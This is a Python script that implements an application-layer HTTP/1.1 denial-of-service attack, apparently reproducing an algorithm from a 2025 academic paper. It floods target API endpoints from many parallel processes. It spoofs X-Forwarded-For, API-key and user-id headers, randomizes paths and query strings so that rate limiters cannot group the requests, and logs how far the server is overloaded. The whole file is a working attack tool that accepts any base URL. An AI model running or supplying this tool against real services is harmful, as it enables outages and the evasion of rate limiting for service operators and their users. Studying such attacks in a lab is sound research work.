#!/usr/bin/env python3
"""
Algorithm 4 — Asymmetric HTTP/1.1 Attack (Python / httpx / multiprocessing).

Implementation of Algorithm 4 from Sivakumar & Thilagam (IJACSA 16/3, 2025).

An *asymmetric* attack differs from the symmetric one in that each request
varies — different endpoint within the heavy-target set, different verb,
different parameters / body — so the request stream cannot be cheaply rate-
limited based on URL similarity alone (§IV.B of the paper).

We pick from *all* entries in the Algorithm-2 target list, cycle the
`X-API-KEY`, `X-Forwarded-For`, `X-User-Id` headers per request, and mutate
the path parameters on every call.

Concurrency model is identical to Algorithm 3: one process per client, M
requests per process.

Usage
-----
    python3 algorithm4_asymmetric.py \\
        --target  ../results/targets.json \\
        --clients 15 --requests 2000 \\
        --base-url http://localhost:8080
"""
from __future__ import annotations

import argparse
import csv
import itertools
import json
import multiprocessing as mp
import os
import random
import string
import sys
import time
from typing import Iterable

import httpx


OVERLOAD_CODES = {429, 503, 509, 520}


def _rand_suffix(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def make_api_key() -> str:
    prefix = random.choice(("AX001-", "BX001-", "CC001-", "ZZ000-"))
    return prefix + _rand_suffix()


def make_headers() -> dict:
    return {
        "X-API-KEY": make_api_key(),
        "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}"
                           f".{random.randint(1,254)}",
        "X-User-Id": f"u-{_rand_suffix(6)}",
        "User-Agent": f"Algo4-Asym/{_rand_suffix(4)}",
        "Accept": "application/json",
        "Connection": "keep-alive",
    }


def _select_targets(targets: dict) -> list[dict]:
    eps = targets.get("target_list") or []
    if not eps:
        # fallback: any endpoint we measured
        eps = [{"method": e["method"], "path": e["path"]}
               for e in targets.get("all_endpoints", [])]
    if not eps:
        raise SystemExit("[!] No targets in targets.json")
    return eps


def _mutate(path: str) -> str:
    """Mutate path parameters / append a noise query argument so the request
    is *unique* and therefore harder for naive rate-limiters."""
    import re
    path = re.sub(r"\{[^}]+\}", lambda _m: str(random.randint(1, 9999)), path)
    sep = "&" if "?" in path else "?"
    return f"{path}{sep}_n={_rand_suffix(4)}"


def _payload_for(method: str) -> dict | None:
    if method == "GET":
        return None
    return {
        "name": _rand_suffix(6),
        "qty":  random.randint(1, 50),
        "note": _rand_suffix(32),
    }


def _worker(args: tuple) -> list[tuple]:
    (worker_id, base_url, targets, requests_n, connections,
     verify_tls) = args

    limits = httpx.Limits(max_keepalive_connections=connections,
                          max_connections=connections)
    timeout = httpx.Timeout(connect=5.0, read=15.0, write=5.0, pool=5.0)
    rows: list[tuple] = []

    with httpx.Client(base_url=base_url, http2=False, verify=verify_tls,
                      limits=limits, timeout=timeout,
                      follow_redirects=False) as client:
        for i in range(requests_n):
            tgt = random.choice(targets)
            method = tgt["method"].upper()
            path = _mutate(tgt["path"])
            payload = _payload_for(method)
            headers = make_headers()
            start = time.perf_counter()
            status, err = -1, ""
            try:
                r = client.request(method, path, headers=headers,
                                   json=payload if method != "GET" else None)
                status = r.status_code
            except httpx.HTTPError as exc:
                err = type(exc).__name__
            elapsed = time.perf_counter() - start
            rows.append((worker_id, i, time.time(), method, path,
                         status, round(elapsed * 1000, 2), err))
    return rows


def run(base_url: str, targets: list[dict], clients: int, requests_n: int,
        connections: int, out_csv: str, verify_tls: bool) -> dict:
    print(f"[+] asymmetric attack | targets={len(targets)} "
          f"| clients={clients} | requests/client={requests_n} "
          f"| total={clients * requests_n}", file=sys.stderr)

    args_iter: Iterable = (
        (i, base_url, targets, requests_n, connections, verify_tls)
        for i in range(clients)
    )

    t0 = time.perf_counter()
    with mp.Pool(processes=clients) as pool:
        results = pool.map(_worker, list(args_iter))
    elapsed = time.perf_counter() - t0

    os.makedirs(os.path.dirname(os.path.abspath(out_csv)), exist_ok=True)
    with open(out_csv, "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["worker", "iteration", "epoch", "method", "path",
                    "status", "latency_ms", "error"])
        for batch in results:
            w.writerows(batch)

    flat = list(itertools.chain.from_iterable(results))
    statuses = [r[5] for r in flat]
    latencies = [r[6] for r in flat if r[5] != -1]
    summary = {
        "targets": targets,
        "clients": clients,
        "requests_per_client": requests_n,
        "total_requests": len(flat),
        "wall_seconds": round(elapsed, 2),
        "rps": round(len(flat) / elapsed, 2) if elapsed else 0,
        "status_breakdown": {
            "2xx": sum(1 for s in statuses if 200 <= s < 300),
            "4xx": sum(1 for s in statuses if 400 <= s < 500),
            "5xx": sum(1 for s in statuses if 500 <= s < 600),
            "overload_429_503_509_520":
                sum(1 for s in statuses if s in OVERLOAD_CODES),
            "transport_errors": sum(1 for s in statuses if s == -1),
        },
        "latency_ms": {
            "min": min(latencies) if latencies else 0,
            "max": max(latencies) if latencies else 0,
            "avg": round(sum(latencies) / len(latencies), 2) if latencies else 0,
        },
        "csv": out_csv,
    }
    print(json.dumps(summary, indent=2))
    return summary


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Algorithm 4 — asymmetric HTTP/1.1 attack")
    ap.add_argument("--target", required=True)
    ap.add_argument("--base-url", default=None)
    ap.add_argument("--clients", type=int, default=15)
    ap.add_argument("--requests", type=int, default=2000)
    ap.add_argument("--connections", type=int, default=32)
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    with open(args.target) as fh:
        targets_doc = json.load(fh)

    base_url = args.base_url or targets_doc.get("base_url")
    if not base_url:
        ap.error("base URL not in targets.json; pass --base-url")

    targets = _select_targets(targets_doc)
    out = args.out or os.path.join(
        os.path.dirname(os.path.abspath(args.target)),
        f"asymmetric_{int(time.time())}.csv")
    run(base_url=base_url, targets=targets,
        clients=args.clients, requests_n=args.requests,
        connections=args.connections, out_csv=out,
        verify_tls=not args.insecure)
    return 0


if __name__ == "__main__":
    sys.exit(main())
